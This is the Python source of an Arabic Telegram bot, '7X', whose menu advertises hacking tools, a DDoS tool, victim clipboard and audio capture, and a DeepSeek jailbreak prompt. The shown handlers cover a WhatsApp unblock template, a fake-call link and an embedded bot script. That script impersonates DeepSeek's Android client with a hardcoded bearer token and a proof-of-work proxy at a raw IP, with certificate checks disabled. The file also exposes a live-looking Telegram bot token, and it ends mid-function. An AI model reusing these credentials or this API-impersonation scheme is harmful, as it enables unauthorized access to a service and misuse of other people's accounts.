import logging
import requests
from bs4 import BeautifulSoup
import random
import string
import re
import base64
import socket
import threading
import time
from datetime import datetime
import json
import os
import tempfile

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Replace with your bot token
TOKEN = "8729922349:AAGALtZjbmQAmZFx0wEynXK8osEDOAVsG1o"

# Numverify API Key (احصل على مفتاح مجاني من https://apilayer.com/)
NUMVERIFY_API_KEY = "YOUR_API_KEY"  # استبدل هذا بمفتاحك المجاني

# States for ConversationHandler
(
    CHOOSING_MAIN_MENU,
    GETTING_WEBSITE_URL,
    GETTING_IP_INFO_QUERY,
    GETTING_TELEGRAM_USER_ID,
    GETTING_ROBLOX_USERNAME,
    GETTING_DECORATE_TEXT,
    GETTING_DECRYPT_ROBLOX_SCRIPT,
    GETTING_CHECK_LINK_URL,
    GETTING_PHONE_NUMBER,
    GETTING_EMAIL_ADDRESS,
) = range(10)

# Main menu keyboard
main_menu_keyboard = [
    [InlineKeyboardButton("ملفات موقع 🌐", callback_data='website_files'), InlineKeyboardButton("معلومات IP 📍", callback_data='ip_info')],
    [InlineKeyboardButton("إنشاء ايميل 📧", callback_data='generate_email'), InlineKeyboardButton("ادوات اختراق 🛠️", callback_data='hacking_tools')],
    [InlineKeyboardButton("بحث عن مستخدم 🔍", callback_data='search_user'), InlineKeyboardButton("سحب الحافظه 📋", callback_data='clipboard_pull')],
    [InlineKeyboardButton("صوت ضحيه 🎤", callback_data='victim_sound'), InlineKeyboardButton("كيف تصبح هاكر 👨‍💻", callback_data='how_to_be_hacker')],
    [InlineKeyboardButton("فك تشفير سكربتات روبلوكس base64 🔓", callback_data='decrypt_roblox'), InlineKeyboardButton("معلومات حساب روبلوكس 👤", callback_data='roblox_account_info')],
    [InlineKeyboardButton("زخرفه ✨", callback_data='decorate_text'), InlineKeyboardButton("نكته 😂", callback_data='joke')],
    [InlineKeyboardButton("اداة DDOS خفيفه تعليميه 💥", callback_data='ddos_tool'), InlineKeyboardButton("فحص الرابط 🔗", callback_data='check_link')],
    [InlineKeyboardButton("توليد كلمات مرور 🔑", callback_data='generate_password'), InlineKeyboardButton("تعليمات 📜", callback_data='instructions')],
    [InlineKeyboardButton("تحليل رقم الهاتف 📱", callback_data='analyze_phone'), InlineKeyboardButton("تحليل الإيميل 📧", callback_data='analyze_email')],
    [InlineKeyboardButton("شرح استعمال DDOS 🛠️", callback_data='ddos_explain'), InlineKeyboardButton("برومبت ديبسيك 😈", callback_data='deepseek_prompt')],
    [InlineKeyboardButton("فك حظر واتس 📱", callback_data='unblock_whatsapp'), InlineKeyboardButton("اتصال وهمي 📞", callback_data='fake_call')],
    [InlineKeyboardButton("توليد بوت تلي جاهز AI 🤖", callback_data='generate_bot')],
]
main_menu_reply_markup = InlineKeyboardMarkup(main_menu_keyboard)

async def start(update: Update, context) -> int:
    user = update.effective_user
    await update.message.reply_html(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def main_menu(update: Update, context) -> int:
    user = update.effective_user
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"مرحباً {user.mention_html()}!\n\nأهلاً بك في بوت 7X 😈!\nمعرف حسابك التليجرام هو: {user.id}",
        reply_markup=main_menu_reply_markup
    )
    return CHOOSING_MAIN_MENU

async def generate_random_email(update: Update, context) -> None:
    """Generate a random Gmail address"""
    query = update.callback_query
    await query.answer()
    
    try:
        # Generate random username (letters and numbers)
        username_length = random.randint(8, 15)
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
        
        # Add random numbers at the end sometimes
        if random.choice([True, False]):
            username += str(random.randint(1, 999))
        
        email = f"{username}@gmail.com"
        
        await query.edit_message_text(
            f"📧 **بريد إلكتروني جديد:**\n\n`{email}`\n\n✅ تم إنشاء البريد بنجاح!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إنشاء بريد جديد", callback_data='generate_email')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
    except Exception as e:
        await query.edit_message_text(
            f"⚠️ حدث خطأ: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def unblock_whatsapp(update: Update, context) -> None:
    """Show WhatsApp unblock guide"""
    query = update.callback_query
    await query.answer()
    
    text = """
📱 **فك حظر واتساب - دليل كامل**

---

• ✅ **1. جهّز الرسالة**

انسخ هذه الرسالة وعدّل فقط رقمك فيها:

عزيزي فريق دعم واتساب،

تم حظر رقمي من استخدام واتساب وأرغب في معرفة السبب ورفع الحظر إذا أمكن، لأنني أستخدم واتساب للتواصل مع العائلة والعمل.

رقمي المحظور هو: +967XXXXXXXX

أؤكد أنني لم أخالف شروط الاستخدام، وأرجو منكم إعادة تفعيل حسابي.

مع التحية.

---

✉️ **2. أرسل الرسالة إلى هذه الإيميلات:**

ارسل نفس الرسالة إلى كل هذه الإيميلات:

• `smb@support.whatsapp.com`
• `android@support.whatsapp.com`
• `support@support.whatsapp.com`

> **ملاحظة:** الأفضل ترسل من 3 أو 4 إيميلات مختلفة لنفس الرسالة عشان تزيد فرص فك الحظر.

---

🚨 **3. نصائح مهمة:**

✏️ اكتب رقمك مع رمز الدولة، مثل: `+9677xxxxxxx`

🕐 انتظر من 1 إلى 3 أيام للرد.

📩 تابع الإيميلات للرد من واتساب.

---

⚠️ **تنبيه:**

• لا تستخدم واتساب المعدل (مثل GBWhatsApp).
• لا ترسل رسائل جماعية أو إعلانات كثيرة.
• إذا تم حظرك أكثر من مرة، قد يكون الحظر دائم.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def fake_call(update: Update, context) -> None:
    """Show fake call website"""
    query = update.callback_query
    await query.answer()
    
    text = """
📞 **اتصال وهمي**

قم بالدخول إلى الموقع وحط الرقم ثم قم بالاتصال (مسموح مرة باليوم):

🌐 **الموقع:** https://callmyphone.org/app

---

📌 **طريقة الاستخدام:**

1. اذهب إلى الرابط أعلاه
2. أدخل رقمك مع رمز الدولة **بدون + أو 00**
3. مثال: `967XXXXXXXX` (رقم يمني)
4. اضغط على زر الاتصال

---

⚠️ **ملاحظة:** مسموح مرة واحدة فقط في اليوم.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def generate_bot_code(update: Update, context) -> None:
    """Show Telegram bot code"""
    query = update.callback_query
    await query.answer()
    
    bot_code = """import urllib.request
import json
import ssl
import os
import re
import tempfile
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime
import threading
import time
import random

ssl._create_default_https_context = ssl._create_unverified_context

BOT_TOKEN = "توكن تيليجرام"
AUTH_TOKEN = "3YBo86VxlMjjVgy6ncFetHucWKT966+n6K9E+cYEAB3K4PTTnziw+klG5zjHiO5w"
POW_PROXY = "http://107.172.78.104:8800"
CHANNEL_USERNAME = "@editortrue"

STREAM_INTERVAL = 0.5
CODE_FILE_THRESHOLD = 300

POW_URL = f"{POW_PROXY}/get_pow?authorization={urllib.request.quote(AUTH_TOKEN)}"
CHAT_URL = "https://chat.deepseek.com/api/v0/chat/completion"
CREATE_SESSION_URL = "https://chat.deepseek.com/api/v0/chat_session/create"
LIST_SESSIONS_URL = "https://chat.deepseek.com/api/v0/chat_session/list"
DELETE_SESSION_URL = "https://chat.deepseek.com/api/v0/chat_session/delete"

LANG_EXT = {
    "python": "py", "py": "py",
    "javascript": "js", "js": "js", "typescript": "ts", "ts": "ts",
    "java": "java", "kotlin": "kt", "swift": "swift",
    "c": "c", "cpp": "cpp", "c++": "cpp", "csharp": "cs", "c#": "cs",
    "go": "go", "golang": "go", "rust": "rs",
    "php": "php", "ruby": "rb", "rb": "rb",
    "bash": "sh", "shell": "sh", "sh": "sh", "zsh": "sh",
    "sql": "sql", "html": "html", "css": "css",
    "xml": "xml", "json": "json", "yaml": "yml", "yml": "yml",
    "r": "r", "matlab": "m", "scala": "scala",
    "dart": "dart", "lua": "lua", "perl": "pl",
    "dockerfile": "dockerfile", "makefile": "makefile",
    "toml": "toml", "ini": "ini", "conf": "conf",
    "markdown": "md", "md": "md",
}

BASE_HEADERS = {
    "User-Agent": "DeepSeek/2.1.0 Android/36",
    "Accept": "application/json",
    "Accept-Encoding": "identity",
    "Content-Type": "application/json",
    "x-client-platform": "android",
    "x-client-version": "2.1.0",
    "x-client-locale": "ar",
    "x-client-bundle-id": "com.deepseek.chat",
    "x-rangers-id": "7693812033879281421",
    "x-client-timezone-offset": "10800",
    "authorization": f"Bearer {AUTH_TOKEN}",
    "accept-charset": "UTF-8",
}

user_data = {}
USER_DATA_FILE = "user_data.json"
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

def load_user_data():
    global user_data
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
                user_data = json.load(f)
        except:
            user_data = {}
    else:
        user_data = {}

def save_user_data():
    try:
        with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_data, f, ensure_ascii=False, indent=2)
    except:
        pass

load_user_data()

def check_subscription(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def subscription_required(func):
    def wrapper(message):
        user_id = message.from_user.id
        if not check_subscription(user_id):
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
            markup.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_sub"))
            bot.reply_to(message,
                f"⚠️ عذراً، يجب عليك الاشتراك في قناتنا أولاً!\\n\\n"
                f"📢 {CHANNEL_USERNAME}\\n"
                f"اضغط على الزر أدناه للاشتراك، ثم اضغط 'تم الاشتراك'",
                reply_markup=markup)
            return
        return func(message)
    return wrapper

def subscription_required_callback(func):
    def wrapper(call):
        user_id = call.from_user.id
        if not check_subscription(user_id):
            bot.answer_callback_query(call.id, "⚠️ يجب الاشتراك في القناة أولاً!", show_alert=True)
            return
        return func(call)
    return wrapper

def extract_code_blocks(text):
    pattern = r"```(\\w*)\\n?([\\s\\S]*?)```"
    matches = re.findall(pattern, text)
    return [(m[0].lower().strip(), m[1].strip()) for m in matches if m[1].strip()]

def get_ext(lang):
    return LANG_EXT.get(lang, "txt")

def should_send_as_file(code):
    return len(code) > CODE_FILE_THRESHOLD

def send_code_files(cid, blocks):
    for lang, code in blocks:
        if not should_send_as_file(code):
            continue
        ext = get_ext(lang)
        name = f"code.{ext}"
        caption = f"📄 `{name}`" + (f"  •  {lang.upper()}" if lang else "")
        with tempfile.NamedTemporaryFile(suffix=f".{ext}", delete=False, mode='w', encoding='utf-8') as f:
            f.write(code)
            tmp = f.name
        try:
            with open(tmp, 'rb') as f:
                bot.send_document(cid, f, visible_file_name=name, caption=caption)
        finally:
            os.unlink(tmp)

def strip_large_code_blocks(text):
    def replacer(m):
        lang = m.group(1).lower().strip()
        code = m.group(2).strip()
        if should_send_as_file(code):
            ext = get_ext(lang)
            return f"📎 تم إرسال الكود كملف `code.{ext}`"
        return m.group(0)
    return re.sub(r"```(\\w*)\\n?([\\s\\S]*?)```", replacer, text)

def get_pow():
    try:
        with urllib.request.urlopen(
            urllib.request.Request(POW_URL), timeout=8
        ) as r:
            return json.loads(r.read().decode()).get("x_ds_pow_response")
    except:
        return None

def create_chat_session():
    h = {**BASE_HEADERS, "host": "chat.deepseek.com", "content-length": "0"}
    try:
        req = urllib.request.Request(CREATE_SESSION_URL, data=b'', headers=h, method='POST')
        with urllib.request.urlopen(req, timeout=10) as r:
            d = json.loads(r.read().decode())
            return d.get("data", {}).get("biz_data", {}).get("chat_session", {}).get("id")
    except:
        return None

def list_sessions():
    h = {**BASE_HEADERS, "host": "chat.deepseek.com", "content-length": "0"}
    try:
        req = urllib.request.Request(LIST_SESSIONS_URL, data=b'', headers=h, method='POST')
        with urllib.request.urlopen(req, timeout=10) as r:
            d = json.loads(r.read().decode())
            return d.get("data", {}).get("biz_data", {}).get("chat_sessions", [])
    except:
        return []

def delete_session(session_id):
    h = {**BASE_HEADERS, "host": "chat.deepseek.com"}
    try:
        req = urllib.request.Request(
            DELETE_SESSION_URL,
            data=json.dumps({"chat_session_id": session_id}).encode(),
            headers=h, method='POST'
        )
        with urllib.request.urlopen(req, timeout=10):
            return True
    except:
        return False

def init_user(uid):
    if str(uid) not in user_data:
        user_data[str(uid)] = {
            "session_id": None,
            "parent_id": None,
            "waiting": False,
            "think": False,
            "search": False,
            "total_msgs": 0,
            "total_chars": 0,
            "model_type": None,
            "temperature": 0.7,
            "max_tokens": 2048,
            "top_p": 0.9,
            "frequency_penalty": 0.0,
            "presence_penalty": 0.0,
            "stream": True,
            "auto_create_session": True,
            "code_auto_send": True,
            "max_history": 10,
            "response_style": "balanced"
        }
        save_user_data()
    return user_data[str(uid)]

def get_all_settings(uid):
    data = init_user(uid)
    return {
        "thinking_enabled": data.get("think", False),
        "search_enabled": data.get("search", False),
        "model_type": data.get("model_type", None),
        "temperature": data.get("temperature", 0.7),
        "max_tokens": data.get("max_tokens", 2048),
        "top_p": data.get("top_p", 0.9),
        "frequency_penalty": data.get("frequency_penalty", 0.0),
        "presence_penalty": data.get("presence_penalty", 0.0),
        "stream": data.get("stream", True),
        "auto_create_session": data.get("auto_create_session", True),
        "code_auto_send": data.get("code_auto_send", True),
        "max_history": data.get("max_history", 10),
        "response_style": data.get("response_style", "balanced")
    }

def stream_with_draft(prompt, pow_response, session_id, parent_id, cid, uid):
    settings = get_all_settings(uid)
    
    payload = {
        "chat_session_id": session_id,
        "prompt": prompt,
        "ref_file_ids": [],
        "thinking_enabled": settings["thinking_enabled"],
        "search_enabled": settings["search_enabled"],
        "audio_id": None,
        "preempt": False,
        "model_type": settings["model_type"],
        "temperature": settings["temperature"],
        "max_tokens": settings["max_tokens"],
        "top_p": settings["top_p"],
        "frequency_penalty": settings["frequency_penalty"],
        "presence_penalty": settings["presence_penalty"],
        "stream": settings["stream"]
    }
    
    if parent_id:
        payload["parent_message_id"] = parent_id

    headers = {**BASE_HEADERS, "x-ds-pow-response": pow_response}
    full_text = ""
    new_parent_id = parent_id
    
    draft_id = int(time.time() * 1000) % 2147483647
    last_update = 0
    chunk_size = 0

    def send_draft(text, is_final=False):
        try:
            if is_final:
                bot.send_message(
                    cid,
                    text,
                    disable_web_page_preview=True,
                    reply_markup=chat_kb()
                )
            else:
                try:
                    bot.send_message_draft(
                        chat_id=cid,
                        draft_id=draft_id,
                        text=text + " ▌",
                        disable_web_page_preview=True
                    )
                except (AttributeError, TypeError):
                    draft_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessageDraft"
                    draft_data = json.dumps({
                        "chat_id": cid,
                        "draft_id": draft_id,
                        "text": text + " ▌",
                        "disable_web_page_preview": True
                    }).encode('utf-8')
                    req = urllib.request.Request(
                        draft_url,
                        data=draft_data,
                        headers={"Content-Type": "application/json"},
                        method='POST'
                    )
                    with urllib.request.urlopen(req, timeout=10) as response:
                        json.loads(response.read().decode())
        except Exception as e:
            pass

    try:
        req = urllib.request.Request(
            CHAT_URL,
            data=json.dumps(payload).encode(),
            headers=headers,
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=90) as resp:
            buf = b""
            first_chunk = True
            
            while True:
                if not user_data.get(str(uid), {}).get("waiting"):
                    break
                raw = resp.read(256)
                if not raw:
                    break
                buf += raw
                while b"\\n" in buf:
                    lb, buf = buf.split(b"\\n", 1)
                    line = lb.decode("utf-8", errors="replace").strip()
                    if not line.startswith("data: "):
                        continue
                    ds = line[6:].strip()
                    if not ds:
                        continue
                    try:
                        evt = json.loads(ds)
                    except:
                        continue

                    if "id" in evt:
                        new_parent_id = evt["id"]
                    if "error" in evt:
                        send_draft("❌ خطأ: " + str(evt["error"]), True)
                        return full_text, new_parent_id

                    p = evt.get("p", "")
                    if "thinking" in p:
                        continue
                    v = evt.get("v", "")
                    if isinstance(v, str) and v:
                        if "content" in p or "text" in p or "answer" in p or p == "":
                            full_text += v
                            chunk_size += len(v)
                            
                            now = time.time()
                            if chunk_size >= 20 or now - last_update >= STREAM_INTERVAL:
                                display = full_text[-3800:] if len(full_text) > 3800 else full_text
                                
                                if first_chunk:
                                    send_draft(display)
                                    first_chunk = False
                                else:
                                    send_draft(display)
                                
                                chunk_size = 0
                                last_update = now

        if not full_text:
            bot.send_message(cid, "❌ لم يصل أي رد.", reply_markup=chat_kb())
            return "", new_parent_id

        if settings["code_auto_send"]:
            blocks = extract_code_blocks(full_text)
            has_large = any(should_send_as_file(c) for _, c in blocks)
            display_text = strip_large_code_blocks(full_text) if has_large else full_text
        else:
            display_text = full_text
            has_large = False

        send_draft(display_text, True)

        if has_large and settings["code_auto_send"]:
            send_code_files(cid, blocks)

        return full_text, new_parent_id

    except Exception as e:
        err = f"❌ خطأ: {e}"
        bot.send_message(cid, err, reply_markup=chat_kb())
        return err, parent_id

def fmt_ts(ts):
    try:
        if isinstance(ts, (int, float)):
            return datetime.fromtimestamp(ts).strftime("%d/%m %H:%M")
        return str(ts)
    except:
        return str(ts)

def safe_edit(cid, mid, text, markup=None):
    try:
        bot.edit_message_text(text, cid, mid, reply_markup=markup,
                              disable_web_page_preview=True)
    except Exception as e:
        if "message is not modified" not in str(e).lower():
            pass

def main_kb():
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
        InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings"),
        InlineKeyboardButton("❓ مساعدة", callback_data="help"),
    )
    return mk

def sessions_kb(sessions, action="select"):
    mk = InlineKeyboardMarkup(row_width=1)
    icon = "💬" if action == "select" else "🗑️"
    for s in sessions[:10]:
        sid = s.get("id", "")
        title = (s.get("title") or "بدون عنوان")[:28]
        msgs = s.get("message_count", 0)
        ts = fmt_ts(s.get("updated_at", ""))
        mk.add(InlineKeyboardButton(
            f"{icon} {title}  •  {msgs}✉️  {ts}",
            callback_data=f"{action}_{sid}"
        ))
    mk.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_main"))
    return mk

def settings_kb(uid):
    settings = get_all_settings(uid)
    mk = InlineKeyboardMarkup(row_width=2)
    
    think = "✅" if settings["thinking_enabled"] else "❌"
    search = "✅" if settings["search_enabled"] else "❌"
    stream = "✅" if settings["stream"] else "❌"
    auto_create = "✅" if settings["auto_create_session"] else "❌"
    code_send = "✅" if settings["code_auto_send"] else "❌"
    
    style_text = {
        'balanced': '⚖️ متوازن',
        'concise': '📝 مختصر',
        'detailed': '📖 مفصل',
        'creative': '🎨 إبداعي'
    }.get(settings['response_style'], '⚖️ متوازن')
    
    mk.add(
        InlineKeyboardButton(f"🧠 التفكير: {think}", callback_data="toggle_think"),
        InlineKeyboardButton(f"🔍 البحث: {search}", callback_data="toggle_search"),
        InlineKeyboardButton(f"🌡️ الحرارة: {settings['temperature']}", callback_data="set_temp"),
        InlineKeyboardButton(f"📝 الرموز: {settings['max_tokens']}", callback_data="set_tokens"),
        InlineKeyboardButton(f"🎯 Top-P: {settings['top_p']}", callback_data="set_topp"),
        InlineKeyboardButton(f"📊 تكرار العقوبة: {settings['frequency_penalty']}", callback_data="set_freq"),
        InlineKeyboardButton(f"📈 وجود العقوبة: {settings['presence_penalty']}", callback_data="set_presence"),
        InlineKeyboardButton(f"🔄 التدفق: {stream}", callback_data="toggle_stream"),
        InlineKeyboardButton(f"🔄 إنشاء تلقائي: {auto_create}", callback_data="toggle_auto"),
        InlineKeyboardButton(f"📎 إرسال الكود: {code_send}", callback_data="toggle_code"),
        InlineKeyboardButton(f"📜 سجل المحادثة: {settings['max_history']}", callback_data="set_history"),
        InlineKeyboardButton(f"📝 نمط الرد: {style_text}", callback_data="toggle_style"),
        InlineKeyboardButton("🔄 إعادة ضبط الكل", callback_data="reset_all"),
        InlineKeyboardButton("🔙 رجوع", callback_data="back_main"),
    )
    return mk

def chat_kb():
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📋 القائمة", callback_data="back_main"),
    )
    return mk

@bot.message_handler(commands=['start'])
@subscription_required
def cmd_start(msg):
    uid = msg.from_user.id
    init_user(uid)
    bot.send_message(msg.chat.id,
        f"👋 أهلاً {msg.from_user.first_name or 'صديقي'}!\\n\\n"
        "أنا بوت DeepSeek 🤖\\n"
        "🚀 Streaming باستخدام sendMessageDraft (الطريقة الرسمية)\\n"
        "تحديث سريع • بدون حظر • تقنية جديدة من تيليجرام\\n\\n"
        "\\n"
        "اكتب سؤالك أو اختر من القائمة:",
        reply_markup=main_kb())

@bot.message_handler(commands=['menu'])
@subscription_required
def cmd_menu(msg):
    bot.send_message(msg.chat.id, "📋 القائمة:", reply_markup=main_kb())

@bot.message_handler(commands=['new'])
@subscription_required
def cmd_new(msg):
    uid = msg.from_user.id
    init_user(uid)
    m = bot.send_message(msg.chat.id, "⏳ جاري الإنشاء...")
    sid = create_chat_session()
    if sid:
        data = init_user(uid)
        data["session_id"] = sid
        data["parent_id"] = None
        save_user_data()
        safe_edit(msg.chat.id, m.message_id,
            f"✅ محادثة جديدة!\\n📌 {sid[:16]}…\\n\\n💬 اكتب سؤالك:",
            markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("📋 القائمة", callback_data="back_main")))
    else:
        safe_edit(msg.chat.id, m.message_id, "❌ فشل الإنشاء.")

@bot.message_handler(commands=['sessions'])
@subscription_required
def cmd_sessions(msg):
    uid = msg.from_user.id
    init_user(uid)
    ss = list_sessions()
    if not ss:
        bot.send_message(msg.chat.id, "❌ لا توجد محادثات.", reply_markup=main_kb())
        return
    bot.send_message(msg.chat.id, "📂 محادثاتك:", reply_markup=sessions_kb(ss))

@bot.message_handler(commands=['cancel'])
@subscription_required
def cmd_cancel(msg):
    uid = msg.from_user.id
    init_user(uid)
    if user_data.get(str(uid), {}).get("waiting"):
        user_data[str(uid)]["waiting"] = False
        save_user_data()
        bot.send_message(msg.chat.id, "⛔ تم الإيقاف.")
    else:
        bot.send_message(msg.chat.id, "لا يوجد شيء نشط.")

@bot.message_handler(commands=['stats'])
@subscription_required
def cmd_stats(msg):
    uid = msg.from_user.id
    init_user(uid)
    _send_stats(msg.chat.id, uid)

@bot.message_handler(commands=['settings'])
@subscription_required
def cmd_settings(msg):
    uid = msg.from_user.id
    init_user(uid)
    settings = get_all_settings(uid)
    text = "⚙️ جميع الإعدادات:\\n\\n"
    for key, value in settings.items():
        text += f"• {key}: {value}\\n"
    bot.send_message(msg.chat.id, text, reply_markup=settings_kb(uid))

@bot.callback_query_handler(func=lambda c: True)
@subscription_required_callback
def cb(call):
    uid = call.from_user.id
    cid = call.message.chat.id
    mid = call.message.message_id
    data = call.data
    init_user(uid)

    if data == "check_sub":
        if check_subscription(uid):
            bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك! يمكنك استخدام البوت.")
            safe_edit(cid, mid, "✅ تم التحقق من اشتراكك! يمكنك استخدام البوت.", markup=main_kb())
        else:
            bot.answer_callback_query(call.id, "❌ لا زلت غير مشترك! اشترك ثم اضغط مرة أخرى.", show_alert=True)
        return

    if data == "new_session":
        bot.answer_callback_query(call.id, "⏳")
        sid = create_chat_session()
        if sid:
            user_data[str(uid)]["session_id"] = sid
            user_data[str(uid)]["parent_id"] = None
            save_user_data()
            safe_edit(cid, mid,
                f"✅ محادثة جديدة!\\n📌 {sid[:16]}…\\n\\n💬 اكتب سؤالك:",
                markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("📋 القائمة", callback_data="back_main")))
        else:
            bot.answer_callback_query(call.id, "❌ فشل الإنشاء!")

    elif data == "list_sessions":
        bot.answer_callback_query(call.id, "⏳")
        ss = list_sessions()
        if not ss:
            safe_edit(cid, mid, "❌ لا توجد محادثات.",
                markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("✏️ إنشاء", callback_data="new_session"),
                    InlineKeyboardButton("🔙 رجوع", callback_data="back_main")))
        else:
            safe_edit(cid, mid, "📂 اختر محادثة:", markup=sessions_kb(ss))

    elif data.startswith("select_"):
        sid = data[7:]
        user_data[str(uid)]["session_id"] = sid
        user_data[str(uid)]["parent_id"] = None
        save_user_data()
        bot.answer_callback_query(call.id, "✅ تم التبديل!")
        safe_edit(cid, mid, f"✅ جلسة: {sid[:16]}…\\n\\n💬 اكتب سؤالك:",
            markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("📋 القائمة", callback_data="back_main")))

    elif data == "delete_menu":
        bot.answer_callback_query(call.id, "⏳")
        ss = list_sessions()
        if not ss:
            safe_edit(cid, mid, "❌ لا توجد محادثات.",
                markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔙 رجوع", callback_data="back_main")))
        else:
            safe_edit(cid, mid, "🗑️ اختر للحذف:", markup=sessions_kb(ss, "delete"))

    elif data.startswith("delete_"):
        sid = data[7:]
        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(
            InlineKeyboardButton("✅ تأكيد", callback_data=f"confirm_del_{sid}"),
            InlineKeyboardButton("❌ إلغاء", callback_data="delete_menu"))
        safe_edit(cid, mid, f"⚠️ حذف المحادثة؟\\n{sid[:16]}…", markup=mk)

    elif data.startswith("confirm_del_"):
        sid = data[12:]
        bot.answer_callback_query(call.id, "⏳")
        if delete_session(sid):
            if user_data[str(uid)].get("session_id") == sid:
                user_data[str(uid)]["session_id"] = None
                user_data[str(uid)]["parent_id"] = None
                save_user_data()
            safe_edit(cid, mid, "✅ تم الحذف!",
                markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔙 القائمة", callback_data="back_main")))
        else:
            safe_edit(cid, mid, "❌ فشل الحذف.",
                markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔙 رجوع", callback_data="back_main")))

    elif data == "stats":
        _send_stats(cid, uid, edit=(cid, mid))

    elif data == "settings":
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "toggle_think":
        user_data[str(uid)]["think"] = not user_data[str(uid)].get("think", False)
        save_user_data()
        st = "مفعّل" if user_data[str(uid)]["think"] else "معطّل"
        bot.answer_callback_query(call.id, f"التفكير العميق: {st}")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "toggle_search":
        user_data[str(uid)]["search"] = not user_data[str(uid)].get("search", False)
        save_user_data()
        st = "مفعّل" if user_data[str(uid)]["search"] else "معطّل"
        bot.answer_callback_query(call.id, f"البحث في الويب: {st}")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "toggle_stream":
        user_data[str(uid)]["stream"] = not user_data[str(uid)].get("stream", True)
        save_user_data()
        st = "مفعّل" if user_data[str(uid)]["stream"] else "معطّل"
        bot.answer_callback_query(call.id, f"التدفق: {st}")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "toggle_auto":
        user_data[str(uid)]["auto_create_session"] = not user_data[str(uid)].get("auto_create_session", True)
        save_user_data()
        st = "مفعّل" if user_data[str(uid)]["auto_create_session"] else "معطّل"
        bot.answer_callback_query(call.id, f"الإنشاء التلقائي: {st}")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "toggle_code":
        user_data[str(uid)]["code_auto_send"] = not user_data[str(uid)].get("code_auto_send", True)
        save_user_data()
        st = "مفعّل" if user_data[str(uid)]["code_auto_send"] else "معطّل"
        bot.answer_callback_query(call.id, f"إرسال الكود: {st}")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "toggle_style":
        styles = ['balanced', 'concise', 'detailed', 'creative']
        current = user_data[str(uid)].get("response_style", "balanced")
        idx = (styles.index(current) + 1) % len(styles)
        user_data[str(uid)]["response_style"] = styles[idx]
        save_user_data()
        style_names = {
            'balanced': 'متوازن',
            'concise': 'مختصر',
            'detailed': 'مفصل',
            'creative': 'إبداعي'
        }
        bot.answer_callback_query(call.id, f"نمط الرد: {style_names[styles[idx]]}")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
